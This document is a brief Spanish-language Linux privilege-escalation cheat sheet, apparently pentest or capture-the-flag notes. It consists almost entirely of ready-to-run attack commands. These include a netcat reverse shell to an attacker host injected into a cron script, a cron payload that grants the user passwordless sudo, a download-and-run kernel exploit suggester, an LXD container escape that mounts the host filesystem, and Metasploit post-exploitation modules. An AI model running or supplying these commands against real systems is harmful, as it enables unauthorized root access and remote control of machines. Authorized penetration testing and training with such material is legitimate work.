# PRIVESC LINUX — Cron, Kernel y LXC

## Cron Jobs
```bash
crontab -l
cat /etc/crontab
find / -name <CRONJOB_SCRIPT>

# Reverse shell via cron
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f" >> /var/www/.mysecretcronjob.sh

# Dar sudo al usuario
printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>
```

## Kernel Exploits
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
```

## LXC/LXD Container Escape
```bash
lxd init
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && ./build-alpine

lxc image import ./alpine-*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite && lxc exec ignite /bin/sh
# Filesystem real en /mnt/root
```

## Post-Enum MSF (Linux)
```bash
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system
```
